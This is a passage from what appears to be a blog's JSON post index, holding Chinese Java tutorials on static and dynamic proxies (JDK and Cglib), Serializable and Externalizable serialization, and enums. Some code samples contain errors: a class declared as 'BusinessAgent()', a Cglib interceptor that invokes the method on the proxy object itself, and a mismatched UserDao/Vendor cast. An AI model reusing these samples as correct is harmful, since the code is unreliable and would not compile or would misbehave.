访问修饰符 - https://www.jianshu.com/p/e81452a19228 深入理解 Java 中 protected 修饰符 - https://juejin.im/post/5a1fdfad5188253e2470c20d 浅析Java中的访问权限控制 - https://www.cnblogs.com/dolphin0520/p/3734915.html","comments":true,"categories":[{"name":"Java","slug":"Java","permalink":"http://swsmile.info/categories/Java/"}],"tags":[{"name":"Java","slug":"Java","permalink":"http://swsmile.info/tags/Java/"}]},{"title":"【Java】Java 动态代理（Dynamic Proxy）","date":"2019-03-28T13:21:38.000Z","path":"2019/03/28/【Java】Java动态代理/","text":"代理我们大家都知道微商代理，简单地说就是代替厂家卖商品，厂家“委托”代理为其销售商品。 关于微商代理，首先我们从他们那里买东西时通常不知道背后的厂家究竟是谁，也就是说，“委托者”对我们来说是不可见的;其次，微商代理主要以朋友圈的人为目标客户，这就相当于为厂家做了一次对客户群体的“过滤”。 我们把微商代理和厂家进一步抽象，前者可抽象为代理类，后者可抽象为委托类(被代理类)。通过使用代理，通常有两个优点，并且能够分别与我们提到的微商代理的两个特点对应起来： 优点一：可以隐藏委托类的实现; 优点二：可以实现客户与委托类间的解耦，在不修改委托类代码的情况下能够做一些额外的处理。 静态代理（Static Proxy）若代理类在程序运行前就已经存在，那么这种代理方式被成为静态代理（Static Proxy） ，这种情况下的代理类通常都是我们在Java代码中定义的。 通常情况下， 静态代理中的代理类和委托类会实现同一接口或是派生自相同的父类。 代理模式静态代理对应设计模式中的代理模式。 定义：给某个对象提供一个代理对象，并由代理对象控制对于原对象的访问，即客户不直接操控原对象，而是通过代理对象间接地操控原对象。 生活中的代理模式要理解代理模式很简单，其实生活当中就存在代理模式： 我们购买火车票可以去火车站买，但是也可以去火车票代售处买，此处的火车票代售处就是火车站购票的代理，即我们在代售点发出买票请求，代售点会把请求发给火车站，火车站把购买成功响应发给代售点，代售点再告诉你。 例子下面我们用Vendor类代表生产厂家，BusinessAgent类代表微商代理，来介绍下静态代理的简单实现，委托类和代理类都实现了Sell接口。 Sell接口的定义如下： 1234567/** * 委托类和代理类都实现了Sell接口 */public interface Sell &#123; void sell(); void ad(); &#125; Vendor类的定义如下： 123456789101112/** * 生产厂家 */public class Vendor implements Sell &#123; public void sell() &#123; System.out.println(\"In sell method\"); &#125; public void ad() &#123; System.out.println(\"ad method\"); &#125;&#125; 代理类BusinessAgent的定义如下： 123456789101112131415161718/** * 代理类 */public class BusinessAgent implements Sell &#123; private Sell vendor; public BusinessAgent(Sell vendor)&#123; this.vendor = vendor; &#125; public void sell() &#123; vendor.sell(); &#125; public void ad() &#123; vendor.ad(); &#125;&#125; 从BusinessAgent类的定义我们可以了解到，静态代理可以通过聚合来实现，让代理类持有一个委托类的引用即可。 下面我们考虑一下这个需求：给Vendor类增加一个过滤功能，只卖货给大学生。通过静态代理，我们无需修改Vendor类的代码就可以实现，只需在BusinessAgent类中的sell方法中添加一个判断即可如下所示： 1234567891011121314151617181920/** * 代理类 */public class BusinessAgent()&#123; implements Sell &#123; private Sell vendor; public BusinessAgent(Sell vendor)&#123; this.vendor = vendor; &#125; public void sell() &#123; if (isCollegeStudent()) &#123; vendor.sell(); &#125; &#125; public void ad() &#123; vendor.ad(); &#125;&#125; 这对应着我们上面提到的使用代理的第二个优点：可以实现客户与委托类间的解耦，在不修改委托类代码的情况下能够做一些额外的处理。静态代理的局限在于运行前必须编写好代理类， 下面我们来介绍下运行时生成代理类的动态代理方式。 动态代理（Dynamic Proxy）什么是动态代理代理类在程序运行时创建的代理方式被成为动态代理（Dynamic Proxy）。 也就是说，这种情况下，代理类并不是在Java代码中定义的，而是在运行时根据我们在Java代码中的“指示”动态生成的。 相比于静态代理， 动态代理的优势在于可以很方便的对代理类的函数进行统一的处理，而不用修改每个代理类的函数。 动态代理在Java中有着广泛的应用，比如Spring AOP，Hibernate数据查询、测试框架的后端mock、RPC，Java注解对象获取等。静态代理的代理关系在编译时就确定了，而动态代理的代理关系是在运行时确定的。静态代理实现简单，适合于代理类较少且确定的情况，而动态代理则给我们提供了更大的灵活性。 动态代理的实现方式Java中，实现动态代理有两种方式： JDK动态代理：java.lang.reflect 包中的Proxy类和InvocationHandler接口提供了生成动态代理类的能力。 Cglib动态代理：Cglib （Code Generation Library）是一个第三方代码生成类库，运行时在内存中动态生成一个子类对象从而实现对目标对象功能的扩展。 例子下面我们结合一个实例来介绍一下动态代理的这个优势是怎么体现的。 现在，假设我们要实现这样一个需求：我们希望在执行委托类中的方法之前先输出“before”，在执行完毕后输出“after”。 我们还是以上面例子中的Vendor类作为委托类，BusinessAgent类作为代理类来进行介绍。 使用静态代理实现首先我们来使用静态代理来实现这一需求，代理类的实现代码如下： 12345678910111213141516171819public class BusinessAgent implements Sell &#123; private Vendor mVendor; public BusinessAgent(Vendor vendor) &#123; this.mVendor = vendor; &#125; public void sell() &#123; System.out.println(\"before\"); mVendor.sell(); System.out.println(\"after\"); &#125; public void ad() &#123; System.out.println(\"before\"); mVendor.ad(); System.out.println(\"after\"); &#125;&#125; 通过静态代理实现我们的需求，需要我们在每个方法中都添加相应的打印逻辑（System.out.println(&quot;before&quot;);和System.out.println(&quot;after&quot;);）。 在BusinessAgent类中，由于只存在sell() 和 ad()两个方法，所以工作量还不算大。 但事实上，这样的实现并不是特别优美。 而且，假如Sell接口中包含上百个方法呢？这时候使用静态代理，就不得不插入大量冗余代码。 通过使用动态代理，我们可以做一个“统一指示”，从而对所有代理类的方法进行统一处理，而不用逐一修改每个方法。 下面我们来介绍下如何使用动态代理方式实现我们的需求。 使用JDK动态代理实现InvocationHandler接口在使用动态代理时，我们需要定义一个位于代理类与委托类之间的中介类，这个中介类需要实现InvocationHandler接口。 在Java中，InvocationHandler接口的定义如下： 123456/** * 调用处理程序 */public interface InvocationHandler &#123; Object invoke(Object proxy, Method method, Object[] args); &#125; 因此，我们的中介类要实现InvocationHandler接口，则需要实现invoke方法。 实现InvocationHandler接口目的：当我们调用代理类对象的方法时，这个“调用”会转送到invoke方法中，代理类对象作为proxy参数传入，参数method标识了我们具体调用的是代理类的哪个方法，args为这个方法的参数。 这样一来，我们对代理类中的所有方法的调用都会变为对invoke的调用，这样我们可以在invoke方法中添加统一的处理逻辑（也可以根据method参数对不同的代理类方法做不同的处理）。 因此，我们只需在中介类的invoke方法实现中输出“before”，然后调用委托类的invoke方法，再输出“after”。下面我们来一步一步具体实现它。 委托类的定义动态代理方式下，要求委托类必须实现某个接口，这里我们实现的是Sell接口。委托类Vendor类的定义如下： 123456789public class Vendor implements Sell &#123; public void sell() &#123; System.out.println(\"In sell method\"); &#125; public void ad() &#123; System.out.println(\"ad method\"); &#125;&#125; 中介类上面我们提到过，中介类必须实现InvocationHandler接口，作为调用处理器”拦截“对代理类方法的调用。 中介类的定义如下： 12345678910111213141516171819public class DynamicProxy implements InvocationHandler &#123; //obj为委托类对象; private Object obj; public DynamicProxy(Object obj) &#123; this.obj = obj; &#125; @Override public Object invoke(Object proxy, Method method, Object[] args) throws Throwable &#123; // 插入的逻辑 System.out.println(\"before\"); Object result = method.invoke(obj, args); // 插入的逻辑 System.out.println(\"after\"); return result; &#125;&#125; 从以上代码中我们可以看到，中介类持有一个委托类对象引用，在invoke方法中调用了委托类对象的相应方法，看到这里是不是觉得似曾相识？ 通过聚合方式持有委托类对象引用，把外部对invoke的调用最终都转为对委托类对象的调用。这不就是我们上面介绍的静态代理的一种实现方式吗？ 实际上， 中介类与委托类构成了静态代理关系，在这个关系中，中介类是代理类，委托类就是委托类； 代理类与中介类也构成一个静态代理关系，在这个关系中，中介类是委托类，代理类是代理类。 也就是说，动态代理关系由两组静态代理关系组成，这就是动态代理的原理。 下面我们来介绍一下如何”指示“以动态生成代理类。 动态生成代理类动态生成代理类的相关代码如下： 123456789101112131415public class Main &#123; public static void main(String[] args) &#123; //创建中介类实例 DynamicProxy inter = new DynamicProxy(new Vendor()); //加上这句将会产生一个$Proxy0.class文件，这个文件即为动态生成的代理类文件 System.getProperties().put(\"sun.misc.ProxyGenerator.saveGeneratedFiles\",\"true\"); //动态生成代理类实例 Sell sell = (Sell)(Proxy.newProxyInstance(Sell.class.getClassLoader(), new Class[] &#123;Sell.class&#125;, inter)); //通过代理类对象调用代理类方法，实际上会转到invoke方法调用 sell.sell(); sell.ad(); &#125;&#125; 在以上代码中，我们调用Proxy类的newProxyInstance方法来获取一个代理类实例。这个代理类实现了我们指定的接口并且会把方法调用分发到指定的调用处理器。 Cglib动态代理前面曾经提到过，实现动态代理有两种方式：JDK动态代理和Cglib动态代理（Cglib (Code Generation Library )。 使用 JDK 生成的动态代理的前提是目标类必须有实现的接口。但这里又引入一个问题，如果某个类没有实现任何接口，就不能使用 JDK 动态代理。所以 CGLIB 代理就是解决这个问题的。 Cglib是一个强大的高性能的代码生成包，它可以在运行期扩展Java类与实现java接口。它广泛的被许多AOP的框架使用，例如Spring AOP和synaop，为他们提供方法的interception（拦截） Cglib包的底层是通过使用字节码处理框架ASM来转换字节码并生成新的子类。 CGLIB 是以动态生成的子类继承目标的方式实现，在运行期动态的在内存中构建一个子类，如下： 1public class UserDao&#123;&#125; // CGLIB 是以动态生成的子类继承目标的方式实现,程序执行时,隐藏了下面的过程public class $Cglib_Proxy_class extends UserDao&#123;&#125; CGLIB 使用的前提是目标类不能被 final 修饰。因为 final 修饰的类不能被继承。 通过Cglib实现动态代理委托类 - Vendor还是回到上面的例子，我们假设委托类Vendor类并没有实现任何接口，定义如下： 123456789public class Vendor &#123; public void sell() &#123; System.out.println(\"In sell method\"); &#125; public void ad() &#123; System.out.println(\"ad method\"); &#125;&#125; Cglib代理工厂 - ProxyFactory123456789101112131415161718192021222324252627282930313233343536373839/** * Cglib子类代理工厂* 对UserDao在内存中动态构建一个子类对象*/public class ProxyFactory implements MethodInterceptor&#123; //维护目标对象 private Object target; public ProxyFactory(Object target) &#123; this.target = target; &#125; //给目标对象创建一个代理对象 public Object getProxyInstance()&#123; //1.工具类 Enhancer en = new Enhancer(); //2.设置父类 en.setSuperclass(target.getClass()); //3.设置回调函数 en.setCallback(this); //4.创建子类(代理对象) return en.create(); &#125; @Override public Object intercept(Object obj, Method method, Object[] args, MethodProxy proxy) throws Throwable &#123; // 插入的逻辑 System.out.println(\"before\"); Object result = method.invoke(obj, args); //执行目标对象的方法 Object returnValue = method.invoke(target, args); // 插入的逻辑 System.out.println(\"after\"); return returnValue; &#125;&#125; 测试类1234567891011121314public class App &#123; @Test public void test()&#123; //目标对象 Vendor vendor = new Vendor(); //代理对象 UserDao proxy = (Vendor)new ProxyFactory(vendor).getProxyInstance(); //执行代理对象的方法 proxy.sell(); &#125;&#125; Spring中的AOP（Aspect Oriented Programming）实际上，在Spring框架中，就是通过动态代理实现面向切面编程（Aspect Oriented Programming，AOP）的。 将日志记录，性能统计，安全控制，事务处理，异常处理等代码从业务逻辑代码中划分出来，可以让被代理的对象专注于完成自己的本职工作（业务逻辑），而代理对象专注于进行业务逻辑执行前后的日志记录，安全控制等附加的功能。 就像插了两个刀到这个被代理的对象前后。所以形象的叫做面向切面编程。 通过对非业务逻辑行为的分离，我们就可以将它们独立到特定的方法中，进而，当需要改变这些行为的时候，不影响业务逻辑的代码，并实现两者的解耦。 在Spring的AOP编程中: 如果加入容器的目标对象有实现接口，用JDK代理； 如果目标对象没有实现接口，用Cglib代理。 Reference Java动态代理 - https://juejin.im/post/5ad3e6b36fb9a028ba1fee6a Java的三种代理模式 - https://segmentfault.com/a/1190000009235245","comments":true,"categories":[{"name":"Java","slug":"Java","permalink":"http://swsmile.info/categories/Java/"}],"tags":[{"name":"Java","slug":"Java","permalink":"http://swsmile.info/tags/Java/"}]},{"title":"【Java】对象的序列化（Serialization）与反序列化（Deserialization）","date":"2019-03-28T02:26:13.000Z","path":"2019/03/28/【Java】对象-对象的序列化与反序列化/","text":"序列化（Serialization）与反序列化（Deserialization）序列化 (Serialization)是将对象的状态信息转换为可以存储或传输的形式的过程。一般将一个对象存储至一个储存媒介，例如档案或是记亿体缓冲等。在网络传输过程中，可以是字节或是XML等格式。而字节的或XML编码格式可以还原完全相等的对象。这个相反的过程又称为反序列化。 Java对象的序列化与反序列化在Java中，我们可以通过多种方式来创建对象，并且只要对象没有被回收我们都可以复用该对象。但是，我们创建出来的这些Java对象都是存在于JVM的堆内存中的。只有JVM处于运行状态的时候，这些对象才可能存在。一旦JVM停止运行，这些对象的状态也就随之而丢失了。 但是在真实的应用场景中，我们需要将这些对象持久化下来，并且能够在需要的时候把对象重新读取出来。Java的对象序列化可以帮助我们实现该功能。 对象序列化机制（object serialization）是Java语言内建的一种对象持久化方式，通过对象序列化，可以把对象的状态保存为字节数组，并且可以在有需要的时候将这个字节数组通过反序列化的方式再转换成对象。对象序列化可以很容易的在JVM中的活动对象和字节数组（流）之间进行转换。 在Java中，对象的序列化与反序列化被广泛应用到RMI(远程方法调用)及网络传输中。 Serializable 接口类通过实现 java.io.Serializable 接口以启用其序列化功能。未实现此接口的类将无法使其任何状态序列化或反序列化。可序列化类的所有子类型本身都是可序列化的。序列化接口没有方法或字段，仅用于标识可序列化的语义。 当试图对一个对象进行序列化的时候，如果遇到不支持 Serializable 接口的对象。在此情况下，将抛出 NotSerializableException。 如果要序列化的类有父类，要想同时将在父类中定义过的变量持久化下来，那么父类也应该实现java.io.Serializable接口。 默认序列化机制如果仅仅只是让某个类实现Serializable接口，而没有其它任何处理的话，则就是使用默认序列化机制。使用默认机制，在序列化对象时，不仅会序列化当前对象本身，还会对该对象引用的其它对象也进行序列化，同样地，这些其它对象引用的另外对象也将被序列化，以此类推。所以，如果一个对象包含的成员变量是容器类对象，而这些容器所含有的元素也是容器类对象，那么这个序列化的过程就会较复杂，开销也较大。 writeObject()方法与readObject()方法如果我们不希望使用默认序列化机制，可以在要序列化的类中定义这两个方法：writeObject()与readObject()。这样，我们就可以自定义地指定带序列化类中哪些字段需要被序列化。 如下所示： 123456789101112public class Person implements Serializable &#123; private void writeObject(ObjectOutputStream out) throws IOException &#123; out.defaultWriteObject(); out.writeInt(age); &#125; private void readObject(ObjectInputStream in) throws IOException, ClassNotFoundException &#123; in.defaultReadObject(); age = in.readInt(); &#125;&#125; 在writeObject()方法中会先调用ObjectOutputStream中的defaultWriteObject()方法，该方法会执行默认的序列化机制。然后再调用writeInt()方法显示地将age字段写入到ObjectOutputStream中。readObject()的作用则是针对对象的读取，其原理与writeObject()方法相同。 必须注意地是，writeObject()与readObject()都是private方法，那么它们是如何被调用的呢？毫无疑问，是使用反射。 例子下面是一个实现了java.io.Serializable接口的类 123456789101112131415161718192021222324252627282930import java.io.Serializable;public class User1 implements Serializable &#123; private String name; private int age; public String getName() &#123; return name; &#125; public void setName(String name) &#123; this.name = name; &#125; public int getAge() &#123; return age; &#125; public void setAge(int age) &#123; this.age = age; &#125; @Override public String toString() &#123; return \"User&#123;\" + \"name='\" + name + '\\'' + \", age=\" + age + '&#125;'; &#125;&#125; 通过下面的代码进行序列化及反序列化 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950import org.apache.commons.io.FileUtils;import org.apache.commons.io.IOUtils;import java.io.*;public class SerializableDemo1 &#123; public static void main(String[] args) &#123; //Initializes The Object User1 user = new User1(); user.setName(\"WeiShi\"); user.setAge(23); System.out.println(user); //Write Obj to File ObjectOutputStream oos = null; try &#123; oos = new ObjectOutputStream(new FileOutputStream(\"tempFile\")); oos.writeObject(user); &#125; catch (IOException e) &#123; e.printStackTrace(); &#125; finally &#123; IOUtils.closeQuietly(oos); &#125; //Read Obj from File File file = new File(\"tempFile\"); ObjectInputStream ois = null; try &#123; ois = new ObjectInputStream(new FileInputStream(file)); User1 newUser = (User1) ois.readObject(); System.out.println(newUser); &#125; catch (IOException e) &#123; e.printStackTrace(); &#125; catch (ClassNotFoundException e) &#123; e.printStackTrace(); &#125; finally &#123; IOUtils.closeQuietly(ois); try &#123; FileUtils.forceDelete(file); &#125; catch (IOException e) &#123; e.printStackTrace(); &#125; &#125; &#125;&#125;//OutPut://User&#123;name='WeiShi', age=23&#125;//User&#123;name='WeiShi', age=23&#125; Externalizable接口除了Serializable 之外，java中还提供了另一个序列化接口Externalizable。 为了了解Externalizable接口和Serializable接口的区别，先来看代码，我们把上面的代码改成使用Externalizable的形式。 123456789101112131415161718192021222324252627282930313233343536373839404142import java.io.Externalizable;import java.io.IOException;import java.io.ObjectInput;import java.io.ObjectOutput;public class User1 implements Externalizable &#123; private String name; private int age; public String getName() &#123; return name; &#125; public void setName(String name) &#123; this.name = name; &#125; public int getAge() &#123; return age; &#125; public void setAge(int age) &#123; this.age = age; &#125; public void writeExternal(ObjectOutput out) throws IOException &#123; &#125; public void readExternal(ObjectInput in) throws IOException, ClassNotFoundException &#123; &#125; @Override public String toString() &#123; return \"User&#123;\" + \"name='\" + name + '\\'' + \", age=\" + age + '&#125;'; &#125;&#125; 1234567891011121314151617181920212223import java.io.*;public class ExternalizableDemo1 &#123; //为了便于理解和节省篇幅，忽略关闭流操作及删除文件操作。真正编码时千万不要忘记 //IOException直接抛出 public static void main(String[] args) throws IOException, ClassNotFoundException &#123; //Write Obj to file ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(\"tempFile\")); User1 user = new User1(); user.setName(\"WeiShi\"); user.setAge(23); oos.writeObject(user); //Read Obj from file File file = new File(\"tempFile\"); ObjectInputStream ois = new ObjectInputStream(new FileInputStream(file)); User1 newInstance = (User1) ois.readObject(); //output System.out.println(newInstance); &#125;&#125;//OutPut://User&#123;name='null', age=0&#125; 通过上面的实例可以发现，对User1类进行序列化及反序列化之后得到的对象的所有属性的值都变成了默认值。也就是说，之前的那个对象的状态并没有被持久化下来。 这就是Externalizable接口和Serializable接口的区别： Externalizable继承了Serializable，该接口中定义了两个抽象方法：writeExternal()与readExternal()。 当使用Externalizable接口来进行序列化与反序列化的时候，需要开发人员重写writeExternal()与readExternal()方法。 由于上面的代码中，并没有在这两个方法中定义序列化实现细节，所以输出的内容为空。 还有一点值得注意：在使用Externalizable进行序列化的时候，在读取对象时，会调用被序列化类的无参构造器去创建一个新的对象，然后再将被保存对象的字段的值分别填充到新对象中。所以，实现Externalizable接口的类必须要提供一个public的无参的构造器。 按照要求修改之后代码如下： 1234567891011121314151617181920212223242526272829303132333435363738394041424344import java.io.Externalizable;import java.io.IOException;import java.io.ObjectInput;import java.io.ObjectOutput;public class User2 implements Externalizable &#123; private String name; private int age; public String getName() &#123; return name; &#125; public void setName(String name) &#123; this.name = name; &#125; public int getAge() &#123; return age; &#125; public void setAge(int age) &#123; this.age = age; &#125; public void writeExternal(ObjectOutput out) throws IOException &#123; out.writeObject(name); out.writeInt(age); &#125; public void readExternal(ObjectInput in) throws IOException, ClassNotFoundException &#123; name = (String) in.readObject(); age = in.readInt(); &#125; @Override public String toString() &#123; return \"User&#123;\" + \"name='\" + name + '\\'' + \", age=\" + age + '&#125;'; &#125;&#125; 1234567891011121314151617181920212223import java.io.*;public class ExternalizableDemo2 &#123; //为了便于理解和节省篇幅，忽略关闭流操作及删除文件操作。真正编码时千万不要忘记 //IOException直接抛出 public static void main(String[] args) throws IOException, ClassNotFoundException &#123; //Write Obj to file ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(\"tempFile\")); User2 user = new User2(); user.setName(\"WeiShi\"); user.setAge(23); oos.writeObject(user); //Read Obj from file File file = new File(\"tempFile\"); ObjectInputStream ois = new ObjectInputStream(new FileInputStream(file)); User2 newInstance = (User2) ois.readObject(); //output System.out.println(newInstance); &#125;&#125;//OutPut://User&#123;name='WeiShi', age=23&#125; 这次，就可以把之前的对象状态持久化下来了。 如果User类中没有无参数的构造函数，在运行时会抛出异常：java.io.InvalidClassException。 transient 关键字123public class Person implements Serializable &#123; transient private Integer age;&#125; transient 关键字的作用是控制字段的序列化，在字段声明前加上transient关键字，会将该字段以这个字段对应类型的默认值序列化到文件中。 如 int 型的是 0，对象型的是 null。 在被反序列化后，transient 字段的值将仍然会保持默认值。 序列化ID情境：两个客户端 A 和 B 试图通过网络传递对象数据，A 端将对象 C 序列化为二进制数据再传给 B，B 反序列化得到 C。 问题：C 对象的全类路径假设为 com.inout.Test，在 A 和 B 端都有这么一个类文件，功能代码完全一致。也都实现了 Serializable 接口，但是反序列化时总是提示不成功。 虚拟机是否允许反序列化，不仅取决于类路径和功能代码是否一致，一个非常重要的一点是两个类的序列化 ID 是否一致（就是 private static final long serialVersionUID)。 序列化 ID 在 Eclipse 下提供了两种生成策略，一个是固定的 1L，一个是随机生成一个不重复的 long 类型数据（实际上是使用 JDK 工具生成），在这里有一个建议，如果没有特殊需求，就是用默认的 1L 就可以，这样可以确保代码一致时反序列化成功。那么随机生成的序列化 ID 有什么作用呢，有些时候，通过改变序列化 ID 可以用来限制某些用户的使用。 Reference 对象的序列化与反序列化 - https://www.WeiShichuang.com/archives/1150 理解Java对象序列化 - http://www.blogjava.net/jiangshachina/archive/2012/02/13/369898.html Java 序列化的高级认识 - https://www.ibm.com/developerworks/cn/java/j-lo-serial/","comments":true,"categories":[{"name":"Java","slug":"Java","permalink":"http://swsmile.info/categories/Java/"}],"tags":[{"name":"Java","slug":"Java","permalink":"http://swsmile.info/tags/Java/"}]},{"title":"【Java】枚举Enum","date":"2019-03-27T03:32:41.000Z","path":"2019/03/27/【Java】枚举Enum/","text":"背景在Java语言中还没有引入枚举类型之前，表示枚举类型的常用模式是声明一组具有int常量。 我们通常利用public final static 方法定义的代码如下，分别用1 表示春天，2表示夏天，3表示秋天，4表示冬天。 123456public class Season &#123; public static final int SPRING = 1; public static final int SUMMER = 2; public static final int AUTUMN = 3; public static final int WINTER = 4;&#125; 这种方法称作int枚举模式。可这种模式有什么问题呢，我们都用了那么久了，应该没问题的。 通常我们写出来的代码都会考虑它的安全性、易用性和可读性。 安全性首先我们来考虑一下它的类型安全性。当然这种模式不是类型安全的。比如说我们设计一个函数，要求传入春夏秋冬的某个值。 但是使用int类型，我们无法保证传入的值为合法。 代码如下所示： 123456789101112131415161718192021222324252627private String getChineseSeason(int season)&#123; StringBuffer result = new StringBuffer(); switch(season)&#123; case Season.SPRING : result.append(\"春天\"); break; case Season.SUMMER : result.append(\"夏天\"); break; case Season.AUTUMN : result.append(\"秋天\"); break; case Season.WINTER : result.append(\"冬天\"); break; default : result.append(\"地球没有的季节\"); break; &#125; return result.toString();&#125;public void doSomething()&#123; System.out.println(this.getChineseSeason(Season.SPRING));//这是正常的场景 System.out.println(this.getChineseSeason(5));//这个却是不正常的场景，这就导致了类型不安全问题&#125; 易用性程序getChineseSeason(Season.SPRING)是我们预期的使用方法，可getChineseSeason(5)显然就不是了，而且编译很通过，在运行时会出现什么情况，我们就不得而知了。这显然就不符合Java程序的类型安全。 可读性接下来我们来考虑一下这种模式的可读性。 使用枚举的大多数场合，我都需要方便地得到枚举类型的字符串表达式。如果将int枚举常量打印出来，我们所见到的就是一组数字，这是没什么太大的用处。 我们可能会想到使用String常量代替int常量。虽然它为这些常量提供了可打印的字符串，但是它会导致性能问题，因为它依赖于字符串的比较操作，所以这种模式也是我们不期望的。 从类型安全性和程序可读性两方面考虑，int和String枚举模式的缺点就显露出来了。 幸运的是，从Java1.5发行版本开始，就提出了另一种可以替代的解决方案，可以避免int和String枚举模式的缺点，并提供了许多额外的好处。那就是枚举类型（enum type）。 定义枚举类型（enum type）是指由一组固定的常量组成合法的类型。Java中由关键字enum来定义一个枚举类型。下面就是Java枚举类型的定义。 123public enum Season &#123; SPRING, SUMMER, AUTUMN, WINER;&#125; 特点Java定义枚举类型的语句很简约。它有以下特点： 使用关键字enum 类型名称，比如这里的Season 一串允许的值，比如上面定义的春夏秋冬四季 枚举可以单独定义在一个文件中，也可以嵌在其它Java类中 除了这样的基本要求外，用户还有一些其他选择 枚举可以实现一个或多个接口（Interface） 可以定义新的变量 可以定义新的方法 可以定义根据具体枚举值而相异的类 应用场景以在背景中提到的类型安全为例，用枚举类型重写那段代码。代码如下： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253public enum Season &#123; SPRING(1), SUMMER(2), AUTUMN(3), WINTER(4); private int code; private Season(int code)&#123; this.code = code; &#125; public int getCode()&#123; return code; &#125;&#125;public class UseSeason &#123; /** * 将英文的季节转换成中文季节 * @param season * @return */ public String getChineseSeason(Season season)&#123; StringBuffer result = new StringBuffer(); switch(season)&#123; case SPRING : result.append(\"[中文：春天，枚举常量:\" + season.name() + \"，数据:\" + season.getCode() + \"]\"); break; case AUTUMN : result.append(\"[中文：秋天，枚举常量:\" + season.name() + \"，数据:\" + season.getCode() + \"]\"); break; case SUMMER : result.append(\"[中文：夏天，枚举常量:\" + season.name() + \"，数据:\" + season.getCode() + \"]\"); break; case WINTER : result.append(\"[中文：冬天，枚举常量:\" + season.name() + \"，数据:\" + season.getCode() + \"]\"); break; default : result.append(\"地球没有的季节 \" + season.name()); break; &#125; return result.toString(); &#125; public void doSomething()&#123; for(Season s : Season.values())&#123; System.out.println(getChineseSeason(s));//这是正常的场景 &#125; //System.out.println(getChineseSeason(5)); //此处已经是编译不通过了，这就保证了类型安全 &#125; public static void main(String[] arg)&#123; UseSeason useSeason = new UseSeason(); useSeason.doSomething(); &#125;&#125; 输出1[中文：春天，枚举常量:SPRING，数据:1] [中文：夏天，枚举常量:SUMMER，数据:2] [中文：秋天，枚举常量:AUTUMN，数据:3] [中文：冬天，枚举常量:WINTER，数据:4] 这里有一个问题，为什么我要将域添加到枚举类型中呢？ 目的是想将数据与它的常量关联起来。如1代表春天，2代表夏天。 总结那么什么时候应该使用枚举呢？ 每当需要一组固定的常量的时候，如一周的天数、一年四季等。或者是在我们编译前就知道其包含的所有值的集合。Java 1.5的枚举能满足绝大部分程序员的要求的，它的简明，易用的特点是很突出的。 源码分析Enum类是Java.lang包中一个类，他是Java语言中所有枚举类型的公共基类。 1public abstract class Enum&lt;E extends Enum&lt;E&gt;&gt; implements Comparable&lt;E&gt;, Serializable 抽象类首先，抽象类不能被实例化，所以我们在Java程序中不能使用new关键字来声明一个Enum，如果想要定义可以使用这样的语法： 12345enum enumName&#123; value1,value2 method1()&#123;&#125; method2()&#123;&#125;&#125; 其次，看到抽象类，第一印象是肯定有类继承它。 至少我们应该是可以继承它的，所以： 123456public class testEnum extends Enum&#123;&#125;public class testEnum extends Enum&lt;Enum&lt;E&gt;&gt;&#123;&#125;public class testEnum&lt;E&gt; extends Enum&lt;Enum&lt;E&gt;&gt;&#123;&#125; 尝试了以上三种方式之后，得出以下结论：Enum类无法被继承。 事实上，Enum类中唯一的一个构造函数只能有编译器调用，因而这个 我们来反编译以下代码： 1enum Color &#123;RED, BLUE, GREEN&#125; 编译器将会把他转成如下内容： 12345678910111213141516171819public final class Color extends Enum&lt;Color&gt; &#123; public static final Color[] values() &#123; return (Color[])$VALUES.clone(); &#125; public static Color valueOf(String name) &#123; ... &#125; private Color(String s, int i) &#123; super(s, i); &#125; public static final Color RED; public static final Color BLUE; public static final Color GREEN; private static final Color $VALUES[]; static &#123; RED = new Color(\"RED\", 0); BLUE = new Color(\"BLUE\", 1); GREEN = new Color(\"GREEN\", 2); $VALUES = (new Color[] &#123; RED, BLUE, GREEN &#125;); &#125;&#125; 短短的一行代码，被编译器处理过之后竟然变得这么多，看来，enmu关键字是Java提供给我们的一个语法糖啊。 从反编译之后的代码中，我们发现，编译器不让我们继承Enum，但是当我们使用enum关键字定义一个枚举的时候，他会帮我们在编译后默认继承Java.lang.Enum类，而不像其他的类一样默认继承Object类。 且采用enum声明后，该类会被编译器加上final声明，故该类是无法继承的。 实现Comparable和Serializable接口Enum实现了Serializable接口，可以序列化。 Enum实现了Comparable接口，可以进行比较，默认情况下，只有同类型的enum才进行比较（原因见后文），要实现不同类型的enum之间的比较，只能复写compareTo方法。 泛型：**&lt;E extends Enum&lt;E&gt;&gt;**怎么理解&lt;E extends Enum&gt;？ 首先，这样写只是为了让Java的API更有弹性，他主要是限定形态参数实例化的对象，故要求只能是Enum，这样才能对 compareTo 之类的方法所传入的参数进行形态检查。所以，我们完全可以不必去关心他为什么这么设计。 我们回到这个令人实在是无法理解的&lt;E extends Enum&gt; 首先我们先来“翻译”一下这个Enum&lt;E extends Enum&gt;到底什么意思，然后再来解释为什么Java要这么用。 我们先看一个比较常见的泛型：List&lt;String&gt;。这个泛型的意思是，List中存的都是String类型，告诉编译器要接受String类型，并且从List中取出内容的时候也自动帮我们转成String类型。 所以Enum&lt;E extends Enum&lt;E&gt;&gt;可以暂时理解为Enum里面的内容都是E extends Enum&lt;E&gt;类型。 这里的E我们就理解为枚举，extends表示上界，比如： List&lt;? extends Object&gt;，List中的内容可以是Object或者扩展自Object的类。这就是extends的含义。 所以，E extends Enum&lt;E&gt;表示为一个继承了Enum&lt;E&gt;类型的枚举类型。 那么，Enum&lt;E extends Enum&lt;E&gt;&gt;就不难理解了，就是一个Enum只接受一个Enum或者他的子类作为参数。相当于把一个子类或者自己当成参数，传入到自身，引起一些特别的语法效果。 为什么Java要这样定义Enum 首先我们来科普一下enum， 123456789101112enum Color&#123; RED,GREEN,YELLOW&#125;enum Season&#123; SPRING,SUMMER,WINTER&#125;public class EnumTest&#123; public static void main(String[] args) &#123; System.out.println(Color.RED.ordinal()); System.out.println(Season.SPRING.ordinal()); &#125;&#125; 代码中两处输出内容都是 0 ，因为枚举类型的默认的序号都是从零开始的。 要理解这个问题，首先我们来看一个Enum类中的方法（暂时忽略其他成员变量和方法）： 123456789101112public abstract class Enum&lt;E extends Enum&lt;E&gt;&gt; implements Comparable&lt;E&gt;, Serializable &#123; private final int ordinal; public final int compareTo(E o) &#123; Enum other = (Enum)o; Enum self = this; if (self.getClass() != other.getClass() &amp;&amp; // optimization self.getDeclaringClass() != other.getDeclaringClass()) throw new ClassCastException(); return self.ordinal - other.ordinal; &#125;&#125; 